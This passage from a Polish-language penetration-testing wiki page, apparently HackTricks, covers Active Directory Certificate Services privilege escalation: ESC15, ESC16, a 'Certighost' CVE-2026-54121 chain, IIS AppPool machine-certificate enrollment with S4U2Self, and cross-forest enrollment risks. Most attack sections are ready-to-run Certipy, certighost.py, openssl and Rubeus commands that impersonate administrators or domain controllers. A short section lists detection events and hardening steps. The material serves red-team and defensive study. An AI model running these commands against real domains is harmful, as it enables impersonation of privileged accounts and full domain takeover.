[Dokumentacja Certipy dotycząca eskalacji uprawnień](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) zawiera bardziej szczegółowe przykłady użycia.<sup>[[14]](#references)</sup>


Polecenie `find` narzędzia Certipy może pomóc zidentyfikować szablony V1 potencjalnie podatne na ESC15, jeśli CA nie ma zainstalowanych poprawek.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Scenariusz A: Bezpośrednia impersonacja przez Schannel

**Krok 1: Zażądaj certyfikatu, wstrzykując „Client Authentication” Application Policy i docelowy UPN.** Napastnik `attacker@corp.local` obiera za cel `administrator@corp.local`, używając szablonu V1 „WebServer” (który pozwala na podanie podmiotu przez osobę rejestrującą).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: Podatny szablon V1 z opcją „Enrollee supplies subject”.
- `-application-policies 'Client Authentication'`: Wstrzykuje OID `1.3.6.1.5.5.7.3.2` do rozszerzenia Application Policies żądania CSR.
- `-upn 'administrator@corp.local'`: Ustawia UPN w SAN do podszywania się.

**Krok 2: Uwierzytelnij się przez Schannel (LDAPS), używając uzyskanego certyfikatu.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Scenariusz B: Impersonacja PKINIT/Kerberos przez nadużycie Enrollment Agent

**Krok 1: Zażądaj certyfikatu z szablonu V1 (z opcją „Enrollee supplies subject”), wstrzykując Application Policy „Certificate Request Agent”.** Ten certyfikat jest dla atakującego (`attacker@corp.local`), aby mógł zostać Enrollment Agentem. Nie określono UPN dla własnej tożsamości atakującego, ponieważ celem jest uzyskanie uprawnień agenta.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: Wstrzykuje OID `1.3.6.1.4.1.311.20.2.1`.

**Step 2: Użyj certyfikatu „agent”, aby zażądać certyfikatu w imieniu docelowego uprzywilejowanego użytkownika.** Jest to krok podobny do ESC3, wykorzystujący certyfikat z Kroku 1 jako certyfikat agenta.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Krok 3: Uwierzytelnij się jako użytkownik uprzywilejowany, używając certyfikatu „on-behalf-of”.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Rozszerzenie zabezpieczeń wyłączone na CA (globalnie)-ESC16

### Wyjaśnienie

**ESC16 (eskalacja uprawnień z powodu braku rozszerzenia szOID_NTDS_CA_SECURITY_EXT)** opisuje globalne dla CA pomijanie rozszerzenia SID **szOID_NTDS_CA_SECURITY_EXT**. Jest to wskaźnik konfiguracji, a nie dowód, że certyfikat może uwierzytelniać jako inne konto. Podszywanie się pod inne konto wymaga również kontroli nad odpowiednimi atrybutami konta lub mapowaniem, szablonu uwierzytelniania klienta, do którego można się zapisać, oraz ścieżki mapowania certyfikatu akceptowanej przez kontroler domeny lub usługę. Załatany KDC w trybie Full Enforcement odrzuca certyfikaty bez rozszerzenia SID, chyba że mają inne silne mapowanie; opisana poniżej procedura Kerberos oparta wyłącznie na UPN dotyczy starszych KDC lub KDC w trybie zgodności, które nadal akceptują słabe mapowanie. Zobacz [wskazówki firmy Microsoft dotyczące mapowania certyfikatów i wymuszania zasad](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Możesz również zapoznać się z tym artykułem, aby dowiedzieć się więcej o szczegółowych zasadach:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Wykorzystanie

Poniższy historyczny przykład Kerberos oparty wyłącznie na UPN bazuje na [dokumentacji ESC16 w Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Wymaga KDC, który nadal akceptuje wynikowe słabe mapowanie; `StrongCertificateBindingEnforcement=1` nie jest już obsługiwanym sposobem obejścia tego ograniczenia po aktualizacji zabezpieczeń systemu Windows z 9 września 2025 r.<sup>[[14]](#references)</sup>

Aby ustalić, czy środowisko Active Directory Certificate Services (AD CS) jest podatne na **ESC16**

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Krok 1: Odczytaj początkowy UPN konta ofiary (opcjonalnie — do przywrócenia).**  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Krok 2: Zaktualizuj UPN konta ofiary, ustawiając go na `sAMAccountName` docelowego administratora.  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Krok 3: (W razie potrzeby) Zdobądź dane uwierzytelniające do konta „ofiary” (np. za pomocą Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Krok 4: Zażądaj certyfikatu jako użytkownik „ofiara” z szablonu uwierzytelniania klienta, do którego konto może się zapisać (np. „User”), na CA skonfigurowanym pod kątem ESC16.** CA pomija rozszerzenie zabezpieczeń SID w wydanym certyfikacie, ale samo w sobie nie ustanawia to użytecznego mapowania uwierzytelniania. Ustaw zmienną środowiskową pamięci podręcznej poświadczeń Kerberos (polecenie powłoki):

```bash
export KRB5CCNAME=victim.ccache
```

Następnie zażądaj certyfikatu:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Krok 5: Przywróć UPN konta "victim".**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Krok 6: Na starszym KDC lub KDC działającym w trybie zgodności, który akceptuje to słabe mapowanie, uwierzytelnij się jako administrator docelowy.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Wyjaśnienie

**Certighost** wykorzystuje ścieżkę **enrollment chase / callback** w **AD CS**, w której CA ufa atrybutom żądania dostarczonym przez wnioskodawcę, aby ustalić tożsamość, która ma zostać umieszczona w wystawionym certyfikacie. W publicznym PoC spreparowane żądanie zawiera:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: kontrolowany przez atakującego host/IP, z którym CA nawiąże połączenie
- **`rmd`**: **nazwa DNS docelowego kontrolera domeny** używana do podszycia się

Jeśli CA podąży tą ścieżką chase, połączy się z atakującym przez **SMB/LSA (`445`)** i **LDAP (`389`)**. Atakujący używa **prawdziwego konta komputera** (zwykle utworzonego z wykorzystaniem domyślnego **`ms-DS-MachineAccountQuota`**), aby sesja callback uwierzytelniła się jako prawidłowy podmiot domeny, ale nieautoryzowane usługi zwracają zamiast tego atrybuty tożsamości **docelowego kontrolera domeny**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Jeśli CA **nie wiąże kryptograficznie zwróconej tożsamości z uwierzytelnionym podmiotem callback**, może wystawić certyfikat dla **kontrolera domeny**, mimo że sesja uwierzytelniła się jako kontrolowane przez atakującego konto komputera. To sprawia, że błąd różni się koncepcyjnie od **Certifried**: zamiast modyfikować atrybuty AD, takie jak `dNSHostName`, atakujący **podmienia dane tożsamości podczas rozpoznawania callback przez CA**.<sup>[[2]](#references)</sup>

**Przydatne warunki wstępne:**

- Niskie uprawnienia **poświadczeń domenowych**
- Możliwość **utworzenia lub ponownego użycia konta komputera**
- Osiągalność sieciowa z **CA** do kontrolowanych przez atakującego **portów `389` i `445`**
- Podatna / niezałatana ścieżka obsługi żądań CA (aktualizacja Microsoftu z **14 lipca 2026 r.** dodała **walidację DC dla `cdc`** oraz **porównanie rozwiązanych SID-ów**)

Uzyskany plik **`.pfx`** można następnie wykorzystać do **PKINIT**, uzyskując **`.ccache`** oraz, w przebiegu opublikowanego PoC, **hash NT docelowego kontrolera domeny**, co zwykle wystarcza do **pełnego przejęcia domeny**.

### Nadużycie

Publiczny PoC automatyzuje cały łańcuch:<sup>[[1]](#references)</sup>

1. Utwórz lub ponownie wykorzystaj kontrolowane przez atakującego **konto komputera**.
2. Uruchom **nieautoryzowane nasłuchujące usługi LDAP i SMB/LSA** na portach `389` i `445`.
3. Wyślij żądanie certyfikatu zawierające kontrolowane przez atakującego atrybuty **`cdc`** i docelowy **`rmd`**.
4. Pozwól CA uwierzytelnić się w nieautoryzowanych usługach przy użyciu kontrolowanego konta komputera, a następnie zwróć w odpowiedzi na zapytania o tożsamość atrybuty **docelowego kontrolera domeny**.
5. Odbierz podpisany przez CA **certyfikat kontrolera domeny**, a następnie użyj go do **PKINIT**.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Przydatne flagi runtime z PoC:

- `--listener <ip>`: jawnie wybiera adres IP callbacku reklamowany w `cdc`
- `--computer-name <NAME$>`: używa ponownie istniejącego konta komputera zamiast tworzyć nowe

**Uwagi operacyjne:**

- PoC wymaga **root**, ponieważ nasłuchuje na **portach uprzywilejowanych** `389` i `445`.
- Pomyślne wykorzystanie luki zapisuje lokalnie **DC `.pfx`** oraz **Kerberos `.ccache`**.
- Ponieważ certyfikat jest przypisany do **konta Domain Controller**, kolejne działania mogą obejmować **uwierzytelnianie Kerberos oparte na certyfikacie**, **DCSync** oraz ponowne użycie odzyskanego **hasha NT konta maszyny**.<sup>[[2]](#references)</sup>

## Rejestracja maszyny IIS AppPool w celu uzyskania uprawnień Administratora na tym samym hoście

Pula IIS działająca jako `ApplicationPoolIdentity` używa **konta komputera** swojego hosta przy uzyskiwaniu dostępu wychodzącego do zasobów sieciowych. Dlatego wykonanie kodu jako `IIS AppPool\<POOL>` pozostaje niskoprzywilejowane w lokalnym tokenie, ale może wysłać żądanie do AD CS, które CA uwierzytelnia jako `HOST$`; jest to zmiana tożsamości wychodzącej, a nie personifikacja tokenu ani lokalna eskalacja uprawnień w stylu Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Ten łańcuch wymaga hosta IIS dołączonego do domeny, dostępnego przez RPC Enterprise CA, opublikowanego szablonu uwierzytelniania maszyn, do którego komputer ma prawa rejestracji, obsługi PKINIT oraz dostępności KDC/SMB. Niestandardowa tożsamość puli zmienia główną tożsamość używaną przy połączeniach wychodzących, dlatego przed założeniem, że będzie to `HOST$`, upewnij się, że pula rzeczywiście używa `ApplicationPoolIdentity`.<sup>[[19]](#references)[[20]](#references)</sup>

### Rejestracja z kluczem kontrolowanym przez atakującego

Wygeneruj parę kluczy i CSR poza serwerem IIS, a następnie zachowaj klucz prywatny. Z przejętego procesu roboczego prześlij **wyłącznie CSR**. [PoC Certi-Bhai dla ASPX](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) tworzy obiekt `CertificateAuthority.Request`, ustawia `CertificateTemplate:Machine`, wywołuje `ICertRequest::Submit` i zwraca wystawiony certyfikat. Użyj ciągu konfiguracyjnego CA `CAHOST\CA-NAME`; zwykły szablon `Machine` buduje nazwę podmiotu na podstawie AD, więc dane podmiotu/SAN podane przez żądającego nie są wymagane.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Połącz zwrócony certyfikat z **odpowiadającym mu zachowanym kluczem**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` działa tylko wtedy, gdy Windows może już skojarzyć certyfikat z dostępnym kluczem prywatnym; w przypadku oddzielnych plików PEM utwórz jawnie PKCS#12:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

Użyj pliku PFX do PKINIT i zachowaj zwrócony TGT komputera w postaci base64, zamiast od razu go wstrzykiwać:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self plus same-host service substitution

S4U2Self pozwala usłudze uzyskać ticket **do samej siebie**, zawierający dane autoryzacyjne innego użytkownika. Mając TGT komputera, Rubeus może zażądać takiego ticketu dla uprzywilejowanego użytkownika, zmienić nazwę usługi w zwróconym KRB-CRED na CIFS i wstrzyknąć ticket. To lokalny mechanizm „delegowania do samego siebie”: nie wymaga S4U2Proxy ani wpisu `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Podmieniony bilet może być używany tylko przez usługi działające na **tym samym koncie/kluczu komputera** (tutaj CIFS na `HOST`). Nie jest to bilet Administratora, którego można używać na innych komputerach w domenie. Wykazany rezultat to uprzywilejowany dostęp SMB/do systemu plików jako Administrator; uzyskanie lokalnego procesu `NT AUTHORITY\SYSTEM` nadal wymaga osobnego kroku zdalnego wykonania.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Wykrywanie i utwardzanie zabezpieczeń

- Na CA koreluj zdarzenia Certification Services **4886** (odebrano żądanie) i **4887** (wydano certyfikat), aby wykrywać nieoczekiwane żądania dotyczące szablonu `Machine` składane przez konta serwerów IIS.<sup>[[19]](#references)[[24]](#references)</sup>
- Na DC zdarzenie **4768** zawiera pola certyfikatu, gdy używane jest uwierzytelnianie wstępne za pomocą certyfikatu; generuj alerty dotyczące nietypowych żądań TGT PKINIT dla kont serwerów internetowych. Następnie sprawdzaj żądania **4769** obejmujące uprzywilejowaną podszywaną tożsamość i ten sam host. Ponieważ Rubeus przepisuje po stronie klienta nazwę usługi KRB-CRED za pomocą `/altservice`, nie wymagaj, aby nazwa usługi po stronie DC w zdarzeniu 4769 wynosiła `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Wykrywaj przypadki, w których `w3wp.exe` łączy się z punktami końcowymi RPC CA, nieoczekiwane tworzenie plików ASPX, dostęp do udziałów administracyjnych uwierzytelniany za pomocą Kerberos oraz aktywność polegającą na zrzucaniu sekretów. Jeśli to możliwe, ogranicz dostęp warstwy aplikacji do CA RPC/KDC/SMB i odbierz uprawnienia do rejestrowania komputerów lub wyłącz szablony uwierzytelniania maszyn, które nie są wymagane operacyjnie.<sup>[[19]](#references)</sup>

## Wyjaśnienie przejmowania lasów za pomocą certyfikatów w stronie biernej

### Zrywanie relacji zaufania między lasami przez przejęte CA

Konfiguracja **rejestrowania między lasami** jest stosunkowo prosta. **Certyfikat głównego CA** z lasu zasobów jest **publikowany w lasach kont** przez administratorów, a certyfikaty **Enterprise CA** z lasu zasobów są **dodawane do kontenerów `NTAuthCertificates` i AIA w każdym lesie kont**. Mówiąc dokładniej, takie rozwiązanie zapewnia **CA w lesie zasobów pełną kontrolę** nad wszystkimi pozostałymi lasami, dla których zarządza ono PKI. Jeśli to CA zostanie **przejęte przez atakujących**, mogą oni **fałszować certyfikaty** wszystkich użytkowników zarówno w lesie zasobów, jak i w lasach kont, naruszając w ten sposób granicę bezpieczeństwa lasu.<sup>[[6]](#references)</sup>

### Uprawnienia do rejestrowania przyznane podmiotom zewnętrznym

W środowiskach wielolasowych należy zachować ostrożność w przypadku Enterprise CA, które **publikują szablony certyfikatów** umożliwiające **Authenticated Users lub podmiotom zewnętrznym** (użytkownikom/grupom spoza lasu, do którego należy Enterprise CA) **rejestrowanie certyfikatów i edycję**.\
Podczas uwierzytelniania przez relację zaufania AD dodaje SID **Authenticated Users** do tokenu użytkownika. Jeśli więc domena ma Enterprise CA z szablonem, który **przyznaje grupie Authenticated Users uprawnienia do rejestrowania certyfikatów**, użytkownik z innego lasu może potencjalnie **zarejestrować certyfikat na podstawie tego szablonu**. Podobnie, jeśli szablon **jawnie przyznaje uprawnienia do rejestrowania certyfikatów podmiotowi zewnętrznemu**, powstaje w ten sposób **relacja kontroli dostępu między lasami**, która umożliwia podmiotowi z jednego lasu **zarejestrowanie certyfikatu na podstawie szablonu z innego lasu**.

Oba scenariusze **zwiększają powierzchnię ataku** między lasami. Atakujący może wykorzystać ustawienia szablonu certyfikatu, aby uzyskać dodatkowe uprawnienia w obcej domenie.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 repozytorium PoC](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - analiza techniczna Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – blog SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: nadużywanie Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, GUI BloodHound, nowe metody uwierzytelniania i żądania oraz więcej](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: nadużywanie mapowania kont Key Trust w celu przejęcia konta](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – historia niewłaściwego użycia Enhanced Key](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – przekazywanie żądań do AD Certificate Services przez RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: dostęp powłoki do CA ADCS z YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – technika nadużycia ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – technika nadużycia ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – eskalacja uprawnień (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: nie tylko kolejny AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: błędna konfiguracja i wykorzystanie](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – ponowne omówienie „Delegate 2 Thyself”](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – PoC rejestrowania IIS AD CS](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – eskalacja uprawnień z IIS AppPool przez punkt końcowy RPC AD CS](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – tożsamości puli aplikacji](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – polecenie pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – audyt Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – zdarzenie 4768: zażądano biletu uwierzytelniającego Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – zdarzenie 4769: zażądano biletu usługi Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – zestaw narzędzi PowerShell do wykorzystania AD CS](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
